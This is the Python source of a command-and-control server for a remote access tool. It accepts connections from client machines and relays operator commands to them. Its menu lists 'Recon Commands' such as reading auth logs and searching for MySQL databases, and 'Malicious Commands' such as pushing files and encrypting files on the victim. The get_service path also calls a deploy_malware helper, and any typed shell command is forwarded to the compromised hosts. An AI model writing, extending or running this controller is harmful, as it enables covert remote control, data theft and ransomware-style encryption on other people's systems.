#!usr/bin/python3
import socket
import sys
import os
from colorama import Fore
from commands import *
from commands import depens

ALLOWED_AMOUNT_OF_CONNECTIONS = 2

class Server:
    def __init__(self, host_ip, host_port):
        self.host_ip = host_ip
        self.host_port = host_port
        self.clients = []
    
    def start_conn(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host_ip, self.host_port))

        print("[*]: Server Initiated...")
        print("[*]: Listening to the Client")

        server.listen(ALLOWED_AMOUNT_OF_CONNECTIONS)
        try:
          print(f"{Fore.GREEN}[*]{Fore.RESET}: {Fore.RED}Called Init{Fore.RESET}")
          while len(self.clients) < ALLOWED_AMOUNT_OF_CONNECTIONS:
              client, client_addr = server.accept()
              self.clients.append((client, client_addr))
              print(f"{Fore.GREEN}[*]{Fore.RESET}: Received Connection from", client_addr)
          print(f"{Fore.GREEN}[*]: {Fore.GREEN}Finished Init")
        except Exception as e:
          print(f"Error {e}")



    def command_clients(self):
        # reset command each time
        command = None
        command = input(f'\n{Fore.CYAN}Command: {Fore.RESET}')

        if command == "get_location":
            depens.display_clients(self)
            command = None
            return
        
        if command == "get_open_ports":
            depens.get_open_ports(self)
            command = None
            return 
    
        if command == "get_auth_log":
            depens.get_auth_log(self)
            command = None
            return
    
        if command == "get_sysinfo":
            depens.sysinfo(self)
            command = None
            return
    
        if command == "put_file":
            file = input("File: ")
            depens.put_file(self, file)
            command = None
            return
    
        if command == "encrypt_file":
            file = input("File: ")
            depens.get_file_then_encrpyt(self, file)
            command = None
            return
        
        if command == "get_service":
            depens.Get_service(self)
            depens.deploy_malware(self)
            command = None
            return 
        
        if command == "refresh":
            # use refresh_connection to refresh the connection
            depens.refresh_connection(self)
            command = None
            return 
    
        if command == "find_sql":
            depens.search_for_mysql_database(self)
            command = None
            return 
    
        if command == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            depens.welcome(self, ALLOWED_AMOUNT_OF_CONNECTIONS)
            print("\033[0m")
            print("Clients: ")
            for i in range(len(self.clients)):
                client, client_addr = self.clients[i]
                print(i + 1, ":", client_addr[0], ":", client_addr[1])
            command = None
            self.command_clients()
            command = None

        if command == "help":
            print('-' * 10)
            print("Recon Commands: \n")
            print("get_location")
            print("get_open_ports")
            print("get_auth_log")
            print("get_sysinfo")
            print("get_service")
            print("find_sql")
            print('-' * 10)
            print("Malicious Commands: \n")
            print("put_file")
            print("encrypt_file")
            print('-' * 10)
            print("Extra Commands: \n")
            print("refresh")
            print("clear")
            self.command_clients()
            command = None

        if command == "exit":
            print("Exiting...")
            self.close_conn()
            command = None
            
        if command == None:
            print("You chose nothing")
            self.command_clients()
            command = None
        else:
            # if already running a command above then don't run this
            if command is not None:
                # run on each client connected
                for i in range(len(self.clients)):
                    client, client_addr = self.clients[i]
                    client.send(command.encode())
                    recv_data = client.recv(1024).decode()
                    print("\n Client: ", client_addr[0], "\n Port: ", client_addr[1], "\n Cmd: ", command, "\n\n", recv_data, "\n")                    
                command = None

    def close_conn(self):
        for i in range(len(self.clients)):
            client, client_addr = self.clients[i]
            client.close()
        sys.exit(0)
        
    def online_interaction(self, client_id=None):
        if client_id is not None:
            if client_id == 0:
                self.command_clients()
                return
            # check if client_id is valid
            if client_id < 1 or client_id > len(self.clients):
                print("Invalid Client ID")
                return

            client, client_addr = self.clients[client_id - 1]
        else:
            if len(self.clients) == 0:
                print("No clients connected")
                return

            client, client_addr = self.clients[0]

        while True:
            try:
                interface = '[%s] %s:%s> ' % (client_id, client_addr[0], client_addr[1])
                command = input(interface)

                if command == "exit":
                    break

                client.send(command.encode())
                recv_data = client.recv(1024).decode()
                if recv_data == "":
                    continue
                print("\n", recv_data, "\n")
            except KeyboardInterrupt:
                continue

    def offline_interaction(self, client_id, list_of_commands):
        if client_id < 1 or client_id > len(self.clients):
            print("Invalid Client ID")
            return

        client, _ = self.clients[client_id - 1]
        client.send(str(list_of_commands).encode())
        recv_data = client.recv(1024).decode()
        print("Received output data from Client\n")
        print(recv_data, "\n")


if __name__ == '__main__':
    # clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    if len(sys.argv) < 2:
        print("Usage: python script.py <client_id>")
        print("Usage: python script.py 0 (to display all clients),\n with being able to command them based on commands")
        sys.exit(1)

    client_id = int(sys.argv[1])
    server = Server('0.0.0.0', 0)
    # Welcome Screen
    depens.welcome(server, ALLOWED_AMOUNT_OF_CONNECTIONS)
    print("\033[0m")
    server.start_conn()

    while True:
        server.online_interaction(client_id) 
